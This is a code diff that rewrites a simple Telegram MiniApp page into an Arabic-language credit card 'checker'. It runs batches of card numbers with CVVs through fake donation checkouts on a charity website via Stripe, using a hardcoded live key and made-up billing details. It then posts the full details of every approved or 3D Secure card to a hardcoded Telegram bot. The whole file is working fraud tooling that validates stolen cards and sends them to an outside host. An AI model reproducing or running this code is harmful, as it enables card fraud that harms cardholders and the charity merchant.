@@ -1,17 +1,368 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <title>My MiniApp</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فحص بطاقات الفيزا</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+            direction: rtl;
+            text-align: center;
+        }
+        h1 {
+            color: #0088cc;
+        }
+        .input-container {
+            margin: 20px 0;
+        }
+        textarea {
+            padding: 10px;
+            margin: 5px;
+            width: 90%;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            height: 100px;
+            resize: none;
+        }
+        button {
+            padding: 10px 20px;
+            margin: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #startBtn {
+            background-color: #28a745;
+            color: white;
+        }
+        #stopBtn {
+            background-color: #dc3545;
+            color: white;
+        }
+        #startBtn:hover {
+            background-color: #218838;
+        }
+        #stopBtn:hover {
+            background-color: #c82333;
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        .card-result {
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .approved { background-color: #d4edda; color: #155724; }
+        .declined { background-color: #f8d7da; color: #721c24; }
+        .secure { background-color: #fff3cd; color: #856404; }
+    </style>
 </head>
 <body>
-  <h1>Hello from Telegram MiniApp 🎉</h1>
-  <button onclick="Telegram.WebApp.sendData('Hello Bot!')">Send to Bot</button>
+    <h1>فحص بطاقات الفيزا</h1>
+    <div class="input-container">
+        <textarea id="cardsInput" placeholder="أدخل البطاقات (رقم|شهر|سنة|CVV) كل بطاقة في سطر"></textarea>
+    </div>
+    <button id="startBtn" onclick="startChecking()">بدء الفحص</button>
+    <button id="stopBtn" onclick="stopChecking()" disabled>إيقاف الفحص</button>
+    <div id="status">الحالة: في انتظار البدء...</div>
+    <div id="results"></div>
 
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <script>
-    let tg = window.Telegram.WebApp;
-    tg.expand(); // يخلي الواجهة تاخد مساحة كاملة
-  </script>
+    <script>
+        let isChecking = false;
+        let cards = [];
+        let currentCardIndex = 0;
+        const tokbot = '8417545891:AAHa9Tl1xvFSloxXWM6twGhFswP0UQwEN0A';
+        const idbot = '7265421541';
+
+        // تحميل Telegram Web Apps
+        if (window.Telegram && window.Telegram.WebApp) {
+            Telegram.WebApp.ready();
+            Telegram.WebApp.expand();
+            const user = Telegram.WebApp.initDataUnsafe.user;
+            if (user) {
+                document.getElementById('status').innerText += `\nمرحبًا ${user.first_name}!`;
+            }
+        }
+
+        async function startChecking() {
+            if (isChecking) return;
+            isChecking = true;
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+            document.getElementById('status').innerText = 'الحالة: جارٍ الفحص...';
+
+            const cardsInput = document.getElementById('cardsInput').value.trim();
+            cards = cardsInput.split('\n').filter(line => line.trim() !== '');
+            currentCardIndex = 0;
+            document.getElementById('results').innerHTML = '';
+
+            await checkCards();
+        }
+
+        function stopChecking() {
+            isChecking = false;
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+            document.getElementById('status').innerText = 'الحالة: تم الإيقاف.';
+        }
+
+        async function checkCards() {
+            while (isChecking && currentCardIndex < cards.length) {
+                const card = cards[currentCardIndex];
+                try {
+                    const [cc, m, y, cv] = card.split('|');
+                    // تنسيق الشهر والسنة
+                    let month = m.length > 2 ? m.slice(-2) : m;
+                    let year = y.length === 2 ? `20${y}` : y.length > 4 ? y.slice(-4) : y;
+                    document.getElementById('status').innerText = `الحالة: جارٍ فحص البطاقة ${cc}...`;
+
+                    // الطلب الأول: إنشاء التبرع
+                    const cookies = {
+                        'crumb': 'BY4toD9mjC3cNzc5Mzc0ZDZlM2Y4NGY0ZTAwNTViMTliZWIxNTJm',
+                        'ss_cvr': 'af7507f9-3363-41d5-8e97-d07df90223a8|1758598187493|1758598187493|1758598187493|1',
+                        'ss_cvt': '1758598187493',
+                    };
+
+                    const headers = {
+                        'accept': 'application/json',
+                        'content-type': 'application/json',
+                        'origin': 'https://www.discover.org.au',
+                        'referer': 'https://www.discover.org.au/give',
+                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+                    };
+
+                    const json_data = {
+                        'amount': { 'value': 100, 'currencyCode': 'AUD' },
+                        'donationFrequency': 'ONE_TIME',
+                        'feeAmount': null,
+                    };
+
+                    let response = await fetch('https://www.discover.org.au/api/v1/fund-service/websites/68958582dacc87147f1ee5ba/donations/funds/b4097cfb-5ade-4775-be9a-81aadbbda1f0', {
+                        method: 'POST',
+                        headers: headers,
+                        body: JSON.stringify(json_data),
+                        credentials: 'include'
+                    });
+                    let data = await response.json();
+                    const redirect_url = data.redirectUrlPath;
+                    const cart_token = redirect_url.split('cartToken=')[1];
+
+                    // الطلب الثاني: تحديث العميل
+                    const customer_data = { 'email': 'kipap87198@dosonex.com' };
+                    response = await fetch(`https://www.discover.org.au/api/3/commerce/cart/${cart_token}/customer`, {
+                        method: 'PUT',
+                        headers: {
+                            ...headers,
+                            'x-csrf-token': 'BY4toD9mjC3cNzc5Mzc0ZDZlM2Y4NGY0ZTAwNTViMTliZWIxNTJm',
+                        },
+                        body: JSON.stringify(customer_data),
+                        credentials: 'include'
+                    });
+                    const token = (await response.json()).cartToken;
+
+                    // الطلب الثالث: إنشاء طريقة دفع
+                    const payment_data = new URLSearchParams({
+                        'billing_details[address][city]': '112847',
+                        'billing_details[address][country]': 'US',
+                        'billing_details[address][line1]': 'dwdgrg',
+                        'billing_details[address][line2]': '',
+                        'billing_details[address][postal_code]': '10080',
+                        'billing_details[address][state]': 'NY',
+                        'billing_details[name]': 'alex dw',
+                        'billing_details[email]': 'kipap87198@dosonex.com',
+                        'type': 'card',
+                        'card[number]': cc,
+                        'card[exp_year]': year,
+                        'card[exp_month]': month,
+                        'card[cvc]': cv,
+                        'allow_redisplay': 'unspecified',
+                        'referrer': 'https://www.discover.org.au',
+                        'client_attribution_metadata[client_session_id]': '31c30c5b-108e-4b89-9d94-50f900a3f24b',
+                        'client_attribution_metadata[merchant_integration_source]': 'elements',
+                        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
+                        'client_attribution_metadata[merchant_integration_version]': '2021',
+                        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
+                        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
+                        'client_attribution_metadata[elements_session_config_id]': '26272f3d-5385-4772-b513-9dec8e2db976',
+                        'guid': 'cf3e945c-36d4-4aaa-8792-4e287ad0cb23074382',
+                        'muid': '052e4151-db7f-41b6-8b0e-af658bba58fbdbc885',
+                        'sid': '44fec49e-2e01-4568-8bfc-024a731ef5fc7ad494',
+                        'key': 'pk_live_51Awr32AaWJ7jaHZUBEoF9hHaLIZzk152e3XEB8t6KseP4OG9bT8ELhOhkOu1GDvDBwc79vZylAw7wfWhSlCmTqZQ00RbF05Okl',
+                        '_stripe_account': 'acct_1Awr32AaWJ7jaHZU',
+                    });
+
+                    response = await fetch('https://api.stripe.com/v1/payment_methods', {
+                        method: 'POST',
+                        headers: {
+                            'accept': 'application/json',
+                            'content-type': 'application/x-www-form-urlencoded',
+                            'origin': 'https://js.stripe.com',
+                            'referer': 'https://js.stripe.com/',
+                            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+                        },
+                        body: payment_data
+                    });
+                    const payment_result = await response.json();
+                    if (!payment_result.id) {
+                        throw new Error('Invalid month or year');
+                    }
+                    const ide = payment_result.id;
+
+                    // الطلب الرابع: إتمام الطلب
+                    const order_data = {
+                        'email': 'kipap87198@dosonex.com',
+                        'subscribeToList': false,
+                        'shippingAddress': {
+                            'id': '',
+                            'firstName': '',
+                            'lastName': '',
+                            'line1': '',
+                            'line2': '',
+                            'city': '112847',
+                            'region': 'NY',
+                            'postalCode': '',
+                            'country': '',
+                            'phoneNumber': '',
+                        },
+                        'createNewUser': false,
+                        'newUserPassword': null,
+                        'saveShippingAddress': false,
+                        'makeDefaultShippingAddress': false,
+                        'customFormData': null,
+                        'shippingAddressId': null,
+                        'proposedAmountDue': {
+                            'decimalValue': '1',
+                            'currencyCode': 'AUD',
+                        },
+                        'cartToken': cart_token,
+                        'paymentToken': {
+                            'stripePaymentTokenType': 'PAYMENT_METHOD_ID',
+                            'token': ide,
+                            'type': 'STRIPE',
+                        },
+                        'billToShippingAddress': false,
+                        'billingAddress': {
+                            'id': '',
+                            'firstName': 'alex',
+                            'lastName': 'dw',
+                            'line1': 'dwdgrg',
+                            'line2': '',
+                            'city': '112847',
+                            'region': 'NY',
+                            'postalCode': '10080',
+                            'country': 'US',
+                            'phoneNumber': '14178819390',
+                        },
+                        'savePaymentInfo': false,
+                        'makeDefaultPayment': false,
+                        'paymentCardId': null,
+                        'universalPaymentElementEnabled': true,
+                    };
+
+                    response = await fetch('https://www.discover.org.au/api/2/commerce/orders', {
+                        method: 'POST',
+                        headers: {
+                            'accept': 'application/json, text/plain, */*',
+                            'content-type': 'application/json',
+                            'origin': 'https://www.discover.org.au',
+                            'referer': `https://www.discover.org.au/checkout?cartToken=${cart_token}`,
+                            'x-csrf-token': 'BY4toD9mjC3cNzc5Mzc0ZDZlM2Y4NGY0ZTAwNTViMTliZWIxNTJm',
+                            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+                        },
+                        body: JSON.stringify(order_data),
+                        credentials: 'include'
+                    });
+                    const order_result = await response.json();
+
+                    let status, message;
+                    if (order_result.submissionStatus === 'ORDER_CONFIRMED') {
+                        status = 'Approved';
+                        message = 'ORDER CONFIRMED';
+                        const telegram_message = `
+🔥 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 1$ 🔥
+
+💳[↯] 𝗖𝗖 ⇾ ${cc}|${m}|${y}|${cv} 
+📩 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
+⚡ 𝗥𝗲𝘀𝗽𝗼�_n𝘀𝗲 : ORDER CONFIRMED 🪄
+🛠 𝗚𝗮𝘁𝗲 : Stripe Charge
+Proxy : Live ☁️
+━━━━━━━━━━━━━━━━━━━
+🤖 Powered by ⇾ 『@carti_py』
+                        `;
+                        await fetch(`https://api.telegram.org/bot${tokbot}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: idbot,
+                                text: telegram_message
+                            })
+                        });
+
+                        if (window.Telegram && window.Telegram.WebApp) {
+                            Telegram.WebApp.sendData(JSON.stringify({
+                                card: `${cc}|${m}|${y}|${cv}`,
+                                status: 'Approved',
+                                message: 'ORDER CONFIRMED'
+                            }));
+                        }
+                    } else if (order_result.failureType === 'PAYMENT_DECLINED') {
+                        status = 'Declined';
+                        message = 'PAYMENT DECLINED';
+                    } else if (order_result.failureType === 'EXTRA_PAYMENT_AUTHENTICATION_REQUIRED') {
+                        status = '3D Secure';
+                        message = 'EXTRA_PAYMENT_AUTHENTICATION_REQUIRED';
+                        const telegram_message = `
+🔥 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 1$ 🔥
+
+💳[↯] 𝗖𝗖 ⇾ ${cc}|${m}|${y}|${cv} 
+📩 𝗦𝘁𝗮𝘁𝘂𝘀 : 3D SECURE 🟠
+⚡ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : 3D SECURE 🟠
+🛠 𝗚𝗮𝘁𝗲 : Stripe Charge
+Proxy : Live ☁️
+━━━━━━━━━━━━━━━━━━━
+🤖 Powered by ⇾ 『@carti_py』
+                        `;
+                        await fetch(`https://api.telegram.org/bot${tokbot}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: idbot,
+                                text: telegram_message
+                            })
+                        });
+                    }
+
+                    // عرض النتيجة
+                    const resultDiv = document.createElement('div');
+                    resultDiv.className = `card-result ${status.toLowerCase()}`;
+                    resultDiv.innerText = `البطاقة: ${cc}|${m}|${y}|${cv} - الحالة: ${status} - الرد: ${message}`;
+                    document.getElementById('results').prepend(resultDiv);
+
+                    currentCardIndex++;
+                    await new Promise(resolve => setTimeout(resolve, 10000)); // تأخير 10 ثوانٍ
+                } catch (error) {
+                    const resultDiv = document.createElement('div');
+                    resultDiv.className = 'card-result declined';
+                    resultDiv.innerText = `البطاقة: ${card} - خطأ: ${error.message}`;
+                    document.getElementById('results').prepend(resultDiv);
+                    currentCardIndex++;
+                    await new Promise(resolve => setTimeout(resolve, 10000));
+                }
+            }
+
+            if (currentCardIndex >= cards.length) {
+                stopChecking();
+                document.getElementById('status').innerText = 'الحالة: اكتمل فحص جميع البطاقات.';
+            }
+        }
+    </script>
 </body>
 </html>
